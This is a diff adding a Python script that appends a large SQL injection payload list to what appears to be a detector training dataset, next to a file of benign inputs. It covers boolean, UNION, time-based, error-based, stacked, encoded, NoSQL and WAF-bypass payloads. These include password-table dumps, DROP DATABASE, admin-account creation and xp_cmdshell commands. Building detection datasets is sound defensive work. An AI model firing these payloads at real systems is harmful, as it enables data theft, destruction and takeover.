@@ -1,0 +1,293 @@
+#!/usr/bin/env python3
+"""Append additional SQLi payloads to expand the dataset."""
+
+additional_sqli = '''
+# ==================== ADDITIONAL BOOLEAN PAYLOADS ====================
+' OR 'admin'='admin
+' OR 'user'='user
+' OR '1' LIKE '1
+' OR '1' LIKE '1'--
+' OR '%'='%
+' OR 1 LIKE 1--
+' OR 'a' LIKE 'a'--
+' OR 1 IN (1)--
+' OR 1 IN (1,2)--
+' OR 1 NOT IN (2)--
+' OR 1 BETWEEN 0 AND 2
+' OR 1=1 -- comment
+' OR 1=1 /* comment */
+' OR 1=1 # comment
+' OR a=a--
+' OR b=b--
+' OR '1'!='2'--
+' OR '1'<>'2'--
+' OR 1+1=2--
+' OR 2-1=1--
+' OR 2*2=4--
+' OR 4/2=2--
+' OR 5%3=2--
+' OR ASCII('a')=97--
+' OR CHAR(65)='A'--
+' OR LENGTH('test')=4--
+' OR SUBSTR('test',1,1)='t'--
+' OR LEFT('test',1)='t'--
+' OR RIGHT('test',1)='t'--
+' OR UPPER('a')='A'--
+' OR LOWER('A')='a'--
+' OR TRIM(' a ')='a'--
+' OR CONCAT('a','b')='ab'--
+' OR COALESCE(NULL,'a')='a'--
+' OR IFNULL(NULL,'a')='a'--
+' OR GREATEST(1,2)=2--
+' OR LEAST(1,2)=1--
+' OR ABS(-1)=1--
+' OR FLOOR(1.5)=1--
+' OR CEIL(1.5)=2--
+' OR ROUND(1.5)=2--
+' OR MOD(5,3)=2--
+' OR POWER(2,3)=8--
+' OR SQRT(4)=2--
+' OR NOW()>0--
+' OR CURDATE()>0--
+' OR YEAR(NOW())>2020--
+' OR MONTH(NOW())>0--
+' OR DAY(NOW())>0--
+' OR MD5('a')!='x'--
+' OR SHA1('a')!='x'--
+' OR HEX('a')='61'--
+' OR ORD('a')=97--
+' OR LOCATE('a','abc')>0--
+' OR INSTR('abc','a')>0--
+' OR STRCMP('a','a')=0--
+' OR REVERSE('abc')='cba'--
+' OR REPEAT('a',2)='aa'--
+' OR VERSION()!='x'--
+' OR CONNECTION_ID()>0--
+
+# ==================== ADDITIONAL UNION PAYLOADS ====================
+' UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10--
+' UNION SELECT DISTINCT 1,2,3,4,5,6,7,8,9,10--
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--
+' UNION SELECT * FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT * FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT * FROM mysql.user--
+' UNION SELECT * FROM mysql.db--
+' UNION SELECT * FROM pg_catalog.pg_tables--
+' UNION SELECT * FROM pg_catalog.pg_user--
+' UNION SELECT * FROM all_tables WHERE owner=USER--
+' UNION SELECT * FROM user_tables--
+' UNION SELECT * FROM dba_tables--
+' UNION SELECT 1,@@version,user(),database(),5--
+' UNION SELECT 1,table_name,column_name,data_type,5 FROM information_schema.columns--
+' UNION SELECT 1,grantee,privilege_type,is_grantable,5 FROM information_schema.user_privileges--
+' UNION SELECT 1,schema_name,default_character_set_name,default_collation_name,5 FROM information_schema.schemata--
+' UNION SELECT 1,user,host,password,5 FROM mysql.user--
+' UNION SELECT 1,datname,datdba,encoding,5 FROM pg_database--
+' UNION SELECT 1,usename,usesysid,usecreatedb,5 FROM pg_user--
+' UNION SELECT 1,name,type,owner_id,5 FROM sys.objects--
+' UNION SELECT 1,name,database_id,create_date,5 FROM sys.databases--
+' UNION SELECT 1,username,password,account_status,5 FROM dba_users--
+' UNION SELECT 1,table_name,owner,tablespace_name,5 FROM all_tables--
+' UNION (SELECT 1,2,3,4,5)--
+' UNION ALL (SELECT 1,2,3,4,5)--
+
+# ==================== ADDITIONAL TIME-BASED PAYLOADS ====================
+' AND SLEEP(2)--
+' AND SLEEP(7)--
+' AND SLEEP(8)--
+' AND SLEEP(20)--
+' AND SLEEP(30)--
+' OR SLEEP(2)--
+' OR SLEEP(7)--
+' OR SLEEP(15)--
+' AND IF(1=1,SLEEP(3),0)--
+' AND IF(1=1,SLEEP(7),0)--
+' AND IF(1=1,SLEEP(10),0)--
+' AND (SELECT SLEEP(3))--
+' AND (SELECT SLEEP(7))--
+' AND (SELECT SLEEP(10))--
+' AND BENCHMARK(5000000,SHA1('test'))--
+' AND BENCHMARK(50000000,SHA1('test'))--
+' AND BENCHMARK(5000000,MD5('test'))--
+' AND BENCHMARK(50000000,MD5('test'))--
+'; WAITFOR DELAY '0:0:1'--
+'; WAITFOR DELAY '0:0:2'--
+'; WAITFOR DELAY '0:0:7'--
+'; WAITFOR DELAY '0:0:15'--
+'; WAITFOR DELAY '0:0:20'--
+'; WAITFOR DELAY '0:1:0'--
+' AND pg_sleep(1)--
+' AND pg_sleep(2)--
+' AND pg_sleep(7)--
+' AND pg_sleep(10)--
+' AND pg_sleep(15)--
+' AND DBMS_PIPE.RECEIVE_MESSAGE('a',1)--
+' AND DBMS_PIPE.RECEIVE_MESSAGE('a',2)--
+' AND DBMS_PIPE.RECEIVE_MESSAGE('a',7)--
+' AND DBMS_PIPE.RECEIVE_MESSAGE('a',10)--
+' AND (SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END))--
+' AND (SELECT (CASE WHEN (1=2) THEN SLEEP(5) ELSE 0 END))--
+' AND 1=1 AND SLEEP(5)--
+' AND 1=2 OR SLEEP(5)--
+' OR 1=1 AND SLEEP(5)--
+
+# ==================== ADDITIONAL ERROR-BASED PAYLOADS ====================
+' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,user()))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,@@datadir))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,@@basedir))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,@@hostname))--
+' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,user()),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,@@datadir),1)--
+' AND 1=CONVERT(int,@@version)--
+' AND 1=CONVERT(int,user_name())--
+' AND 1=CONVERT(int,db_name())--
+' AND 1=CONVERT(int,@@servername)--
+' AND (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--
+' AND (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--
+' AND EXP(~(SELECT * FROM(SELECT version())a))--
+' AND EXP(~(SELECT * FROM(SELECT user())a))--
+' AND GTID_SUBSET(CONCAT(0x7e,version()),1)--
+' AND GTID_SUBSET(CONCAT(0x7e,user()),1)--
+' AND 1/0--
+' AND 1=utl_inaddr.get_host_address((SELECT user FROM dual))--
+' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--
+
+# ==================== ADDITIONAL STACKED QUERIES ====================
+'; SELECT * FROM users--
+'; SELECT * FROM admins--
+'; SELECT * FROM accounts--
+'; SELECT * FROM members--
+'; SELECT * FROM customers--
+'; SELECT * FROM employees--
+'; SELECT * FROM profiles--
+'; SELECT * FROM passwords--
+'; SELECT * FROM credentials--
+'; SELECT * FROM sessions--
+'; SELECT * FROM tokens--
+'; SELECT * FROM logs--
+'; SELECT * FROM config--
+'; DROP TABLE users CASCADE--
+'; DROP TABLE admins CASCADE--
+'; DROP DATABASE production--
+'; DROP DATABASE master--
+'; TRUNCATE users--
+'; TRUNCATE admins--
+'; DELETE FROM users WHERE 1=1--
+'; DELETE FROM admins WHERE 1=1--
+'; UPDATE users SET password=MD5('hacked')--
+'; UPDATE admins SET password=MD5('hacked')--
+'; UPDATE users SET role='admin'--
+'; INSERT INTO users(username,password,role) VALUES('hacker','hacked','admin')--
+'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'--
+'; CREATE USER 'hacker'@'%' IDENTIFIED BY 'hacked'--
+'; EXEC xp_cmdshell 'whoami'--
+'; EXEC xp_cmdshell 'dir c:\\\\'--
+'; EXEC xp_cmdshell 'net user hacker hacked /add'--
+'; EXEC master..xp_cmdshell 'ping -n 10 127.0.0.1'--
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
+
+# ==================== ADDITIONAL ENCODED PAYLOADS ====================
+%27%20OR%201%3D1%2D%2D
+%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%2D%2D
+%27%20AND%20SLEEP%2810%29%2D%2D
+%2527%20OR%20%25271%2527%253D%25271
+0x27204f5220313d31
+0x27204f5220273127273d2731
+0x2720554e494f4e2053454c454354204e554c4c
+0x2720414e4420534c45455028313029
+CHAR(39)+OR+CHAR(49)+CHAR(61)+CHAR(49)
+CHAR(39)+UNION+SELECT+NULL+CHAR(45)+CHAR(45)
+%c0%27+OR+1=1--
+%ef%bc%87+OR+1=1--
+%u0027+OR+1=1--
+&#39;+OR+1=1--
+&#x27;+OR+1=1--
+&apos;+OR+1=1--
+
+# ==================== POLYGLOT PAYLOADS ====================
+' OR '1'='1' OR '1'='1
+') OR ('1'='1') OR ('1'='1
+' UNION SELECT 1--' UNION SELECT 1,2--' UNION SELECT 1,2,3--
+' AND 1=1--' OR 1=1--' AND '1'='1
+'-var x=1-'
+'-(1)-'
+
+# ==================== NOSQL INJECTION (Bonus) ====================
+{"$gt":""}
+{"$ne":null}
+{"$ne":""}
+{"$regex":".*"}
+{"$where":"1==1"}
+{"$or":[{"a":"a"},{"b":"b"}]}
+{"$and":[{"a":"a"},{"b":"b"}]}
+{"$exists":true}
+{"$type":2}
+{"$in":["a","b"]}
+{"$nin":["x","y"]}
+admin'--
+{"username":{"$gt":""},"password":{"$gt":""}}
+{"username":"admin","password":{"$ne":""}}
+{"username":"admin","password":{"$regex":".*"}}
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+'; return '' == '
+'; return true; var foo='
+' || 1==1 || '1'=='
+' || 'a'=='a
+{$gt: ""}
+[$gt]=
+
+# ==================== MORE WAF BYPASS VARIATIONS ====================
+'%a0OR%a01=1--
+'%0bOR%0b1=1--
+'%0cOR%0c1=1--
+'%00OR%001=1--
+' /*!11440OR*/ 1=1--
+' /*!11441UNION*/ /*!11441SELECT*/ 1,2,3--
+' /*!32302OR*/ 1=1--
+' /*!32302UNION*/ /*!32302SELECT*/ 1,2,3--
+' OR/**_**/1=1--
+' UNION/**_**/SELECT/**_**/1,2,3--
+' %4fR 1=1--
+' %53ELECT 1,2,3--
+' %55NION %53ELECT 1,2,3--
+' OR%231=1%0A--
+' UNION%23SELECT%0A1,2,3--
+' OR--%0A1=1--
+' UNION--%0ASELECT--%0A1,2,3--
+'+OR+'1'='1
+'+UNION+SELECT+1,2,3--
+'-OR-1=1--
+'-UNION-SELECT-1,2,3--
+'_OR_1=1--
+'_UNION_SELECT_1,2,3--
+'.OR.1=1--
+'.UNION.SELECT.1,2,3--
+'/OR/1=1--
+'/UNION/SELECT/1,2,3--
+'(OR(1=1))--
+'(UNION(SELECT(1,2,3)))--
+'''
+
+import os
+script_dir = os.path.dirname(os.path.abspath(__file__))
+
+# Append to file
+with open(os.path.join(script_dir, 'sqli_payloads_expanded.txt'), 'a', encoding='utf-8') as f:
+    f.write(additional_sqli)
+
+# Count total
+with open(os.path.join(script_dir, 'sqli_payloads_expanded.txt'), 'r', encoding='utf-8') as f:
+    sqli = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
+
+with open(os.path.join(script_dir, 'benign_inputs_expanded.txt'), 'r', encoding='utf-8') as f:
+    benign = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
+
+print(f'SQLi Payloads: {len(sqli)}')
+print(f'Benign Inputs: {len(benign)}')
+print(f'Total Samples: {len(sqli) + len(benign)}')
